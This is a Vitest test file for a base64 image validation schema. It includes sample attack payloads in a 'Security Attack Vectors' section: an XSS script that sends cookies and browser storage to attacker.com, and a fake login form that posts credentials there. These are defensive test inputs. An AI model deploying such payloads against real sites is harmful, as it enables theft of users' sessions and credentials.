import { base64ImageSchema } from "@/lib/zod/schemas/misc";
import { describe, expect, it } from "vitest";

describe("base64ImageSchema", () => {
  it("should validate a correct base64 PNG image", async () => {
    const validBase64Image =
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
    await expect(
      base64ImageSchema.parseAsync(validBase64Image),
    ).resolves.not.toThrow();
  });

  it("should reject an invalid image type", async () => {
    const invalidImageType =
      "data:image/invalid;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
    await expect(
      base64ImageSchema.parseAsync(invalidImageType),
    ).rejects.toThrow(
      "Invalid image format, supports only png, jpeg, jpg, gif, webp.",
    );
  });

  it("should reject malformed base64 data", async () => {
    const malformedBase64 = "data:image/png;base64,invalid-base64-data";
    await expect(base64ImageSchema.parseAsync(malformedBase64)).rejects.toThrow(
      "Invalid image format, supports only png, jpeg, jpg, gif, webp.",
    );
  });

  it("should reject a string without data URI prefix", async () => {
    const noPrefix =
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
    await expect(base64ImageSchema.parseAsync(noPrefix)).rejects.toThrow(
      "Invalid image format, supports only png, jpeg, jpg, gif, webp.",
    );
  });

  it("should reject non-image content", async () => {
    // This is a base64 encoded text file
    const textContent =
      "data:image/png;base64," +
      Buffer.from("This is not an image").toString("base64");
    await expect(base64ImageSchema.parseAsync(textContent)).rejects.toThrow(
      "Invalid image format, supports only png, jpeg, jpg, gif, webp.",
    );
  });

  describe("Security Attack Vectors", () => {
    it("should reject stored XSS attempts", async () => {
      // XSS payload with image MIME type
      const xssPayload =
        "data:image/jpeg;base64," +
        Buffer.from(
          `
        <script>
          // Stored XSS payload
          const stolenData = {
            cookies: document.cookie,
            localStorage: localStorage,
            sessionStorage: sessionStorage
          };
          
          // Send to attacker's server
          fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(stolenData)
          });
        </script>
      `,
        ).toString("base64");

      await expect(base64ImageSchema.parseAsync(xssPayload)).rejects.toThrow(
        "Invalid image format, supports only png, jpeg, jpg, gif, webp.",
      );
    });

    it("should reject phishing page injection attempts", async () => {
      // Fake login form with image MIME type
      const phishingPayload =
        "data:image/png;base64," +
        Buffer.from(
          `
        <html>
          <head>
            <title>Login to Your Account</title>
            <style>
              .login-form { /* Styles to match legitimate site */ }
            </style>
          </head>
          <body>
            <form action="https://attacker.com/steal-credentials" method="POST">
              <input type="email" name="email" placeholder="Email">
              <input type="password" name="password" placeholder="Password">
              <button type="submit">Login</button>
            </form>
          </body>
        </html>
      `,
        ).toString("base64");

      await expect(
        base64ImageSchema.parseAsync(phishingPayload),
      ).rejects.toThrow(
        "Invalid image format, supports only png, jpeg, jpg, gif, webp.",
      );
    });
  });
});
